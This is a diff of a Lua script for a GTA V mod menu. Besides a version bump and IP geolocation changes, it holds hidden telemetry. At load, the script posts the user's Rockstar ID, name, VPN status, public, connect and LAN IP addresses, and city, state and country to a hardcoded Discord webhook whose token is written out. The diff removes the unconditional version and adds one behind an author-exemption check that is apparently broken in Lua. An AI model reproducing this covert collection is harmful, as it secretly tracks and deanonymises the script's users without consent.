@@ -1,7 +1,7 @@
 util.require_natives("natives-1681379138", "g-uno")
 util.require_natives("2944b", "g")
 local response = false
-local localVer = 0.48
+local localVer = 0.49
 local currentVer
 async_http.init("raw.githubusercontent.com", "/TheaterChaos/Mein-zeug/main/Meinzeugversion", function(output)
     currentVer = tonumber(output)
@@ -958,8 +958,8 @@ local function get_ip_data(ip)
     local data = {city = "unknown", state = "unknown", country = "unknown"}
     if util.is_soup_netintel_inited() then
         if (loc := soup.netIntel.getLocationByIp(ip)):isValid() then
-            --data.city = loc.city
-            --data.state = loc.state
+            data.city = loc.city
+            data.state = loc.state
             data.country = soup.getCountryName(loc.country_code, "EN")
         end
     end
@@ -990,15 +990,6 @@ local function pidlanguage(pid)
 	local IP = tostring(soup.IpAddr(players.get_connect_ip(pid)))
 	local ip_data = get_ip_data(tostring(IP))
 	languages = ip_data.country
-	return languages
-end
-local function pidlanguagefull(pid)
-	local languages = {city = "unknown", state = "unknown", country = "unknown"}
-	local IP = tostring(soup.IpAddr(players.get_connect_ip(pid)))
-	local ip_data = get_ip_data(tostring(IP))
-	languages.country = ip_data.country
-	languages.city = ip_data.city
-	languages.state = ip_data.state
 	return languages
 end
 
@@ -8365,33 +8356,35 @@ end)
 	util.yield(1000)
 	util.toast(numberofthings)
 end)]]
-local webhookforloginscript = "api/webhooks/1225179507149766717/d2dIYSxB_GyaEdW_Kopni8PC1udPm-6y-64iSWEqKdTlnTQEApsFFjoNe5BdPKU-cjTn"
-local descriptionforwebhooklogin = ""
-local languagesforwebhooklogins = pidlanguagefull(players.user())
-descriptionforwebhooklogin = "RID: ".. players.get_rockstar_id(players.user()) .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
-descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. players.get_ip(players.user()).."// Connect IP: ".. players.get_connect_ip(players.user()).."// Lan IP: ".. players.get_lan_ip(players.user()).."\\n"
-local bodyforloginwebhook = [[
-	{
-		"embeds": [
-		  {
-			"description": "]] .. descriptionforwebhooklogin .. [[",
-			"timestamp": "]] .. os.date("!%Y-%m-%dT%XZ") .. [[",
-			"color": null,
-			"author": {
-			  "name": "]] .. players.get_name(players.user()) .. [[",
-			  "icon_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
-			}
-		  }
-		],
-		"username": "Login in Script",
-		"avatar_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
-	}
-]]
-async_http.init("discord.com", webhookforloginscript, function() end, function() end)
-async_http.set_post("application/json", bodyforloginwebhook)
-async_http.dispatch()
+if not players.get_name(players.user()) == "TheaterChaos20" then
+	local webhookforloginscript = "api/webhooks/1225179507149766717/d2dIYSxB_GyaEdW_Kopni8PC1udPm-6y-64iSWEqKdTlnTQEApsFFjoNe5BdPKU-cjTn"
+	local descriptionforwebhooklogin = ""
+	local languagesforwebhooklogins = get_ip_data(tostring(soup.IpAddr(players.get_connect_ip(players.user()))))
+	descriptionforwebhooklogin = "RID: ".. players.get_rockstar_id(players.user()) .."\\n"
+	descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
+	descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
+	descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. tostring(soup.IpAddr(players.get_ip(players.user()))).."// Connect IP: ".. tostring(soup.IpAddr(players.get_connect_ip(players.user()))).."// Lan IP: ".. tostring(soup.IpAddr(players.get_lan_ip(players.user()))).."\\n"
+	local bodyforloginwebhook = [[
+		{
+			"embeds": [
+			  {
+				"description": "]] .. descriptionforwebhooklogin .. [[",
+				"timestamp": "]] .. os.date("!%Y-%m-%dT%XZ") .. [[",
+				"color": null,
+				"author": {
+				  "name": "]] .. players.get_name(players.user()) .. [[",
+				  "icon_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
+				}
+			  }
+			],
+			"username": "Login in Script",
+			"avatar_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
+		}
+	]]
+	async_http.init("discord.com", webhookforloginscript, function() end, function() end)
+	async_http.set_post("application/json", bodyforloginwebhook)
+	async_http.dispatch()
+end
 vehicle_spawn_list(antiactionvehicles)
 
 util.keep_running()
